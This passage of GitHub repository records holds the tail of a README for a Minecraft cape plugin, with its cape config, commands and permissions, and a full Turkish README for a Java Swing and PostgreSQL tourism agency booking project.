  texture: eyJ0ZXh0dXJlcyI6eyJTS0lOIjp7InVybCI6Imh0dHA6Ly90ZXh0dXJlcy5taW5lY3JhZnQubmV0L3RleHR1cmUvNTRlNDM1OGQ3MzRhNmUwNjhlYjA3Y2I4ZmM1ZmZkZThiOTQ4MDBlYjM5Njc3NzQyOGE0ZjU1OTMxNWExZmY0ZCJ9fX0=
  name: §2Minecon 2012
  description: §7Minecon cape from 2012
  price: 0
  limited_edition: 0
  number_sold: 0
```

## Commands
```
/cape help - prodigycape.help - Show help menu
/cape apply <cape> - no permission - Apply any owned cape
/cape menu - prodigycape.menu - Show your owned cape in inventory menu
/cape shop - prodigycape.shop - Open inventory menu to buy cape
/cape reload - prodigycape.admin - Reload the configurations
/cape sync - prodigycape.admin - Synchronise capes.yml with database mysql
```

## Permissions
```
Individual cape permission: prodigy.cape.<cape_name>
All cape: prodigy.cape.*
Bypass disabled cape to apply:
prodigy.cape.bypass
```

# TO-DO List

- [x] Full packet events implementation (No NMS anymore)
- [ ] Better cape physics
- [ ] Java API for developers
",prodigycape is the most realistic cape plugin for your minecraft server,"bukkit,cape,capes,minecon,minecraft,paper,plugin,purpur,server,spigot",2024-04-05T17:51:02Z,2024-07-16T07:45:45Z,2024-07-16T07:45:45Z,6,4,10,63,8,6,11,6,0,,Java
Snmzgrkn/Turizm_Acente_Sistemi,master,"# Turizm Acentesi Projesi

Bu proje, Patika+ Backend Programı için Bitirme Projesi olarak geliştirilmiştir. Proje, bir turizm acentesi yönetim sistemini simüle etmektedir.
# Veritabanı Şeması
turizmacente.sql
![Veritabanı](images/veritabanı.png)


https://github.com/Snmzgrkn/TurizmAcenteProjesi/assets/56911478/6c2bd6cd-6a52-47c1-9fa6-2dcf8a8bc2e3

![addreservation](https://github.com/Snmzgrkn/TurizmAcenteProjesi/assets/56911478/5869a000-e071-4919-9390-bdeda723d595)
![login](https://github.com/Snmzgrkn/TurizmAcenteProjesi/assets/56911478/eb55ee76-0e66-4ecf-9969-489beb6525a5)

<video src='images/Turizm Acente 2024-04-30 21-41-19.mp4' width=180/>

![login](images/login.png)

![Rezervasyon Ekleme](images/addreservation.png)
-------------------------------------------------------------
## Kullanılan Teknolojiler

- Java
- Swing (GUI)
- PostgreSQL (Veritabanı)
- JDBC (Java Veritabanı Bağlantısı)

## Projeyi Çalıştırma

Proje Java ve Maven ile geliştirildiği için bilgisayarınızda Java ve Maven'in yüklü olması gerekmektedir. Ayrıca PostgreSQL veritabanı da kullanılmaktadır, bu nedenle PostgreSQL sunucusunun da kurulu olması gerekmektedir.

1. Projenin kaynak kodlarını bilgisayarınıza klonlayın:

   ```
   git clone https://github.com/kullanici/proje.git
   
PostgreSQL veritabanında otel adında bir veritabanı oluşturun.

  ```
  db.url=jdbc:postgresql://localhost:5432/otel
  db.user=kullanici
  db.password=sifre
```
24.04.2024 Readme 23:59 olmadan düzeltilecek
# Eksik Kısımlar
- Arama Kısımları
- Rezervasyon Güncelleme Silme 
- Otel Ekleme(Tesis Özellikleri Eklenirken Tip Sorunu Çıkıyor)
  
# Kriterler
1.✅ 2.✅ 3.✅ 4.✅ 5.✅ 6.✅ 7.✅ 8.✅ 9.✅ 10.✅ 11.✅ 12.✅ 13.✅ 14.✅ 15.✅ 16.✅ 17.✅ 18.✅ 19.❌ 20.✅ 21.❌ 22.✅ 23.❌ 24.✅ 25.✅ 
","Bu proje, Patika+ Backend Programı için Bitirme Projesi olarak geliştirilmiştir. Proje, bir turizm acentesi yönetim sistemini simüle etmektedir.",,2024-04-24T17:13:54Z,2024-04-30T18:51:58Z,,0,2,0,30,1,0,11,1,0,,Java
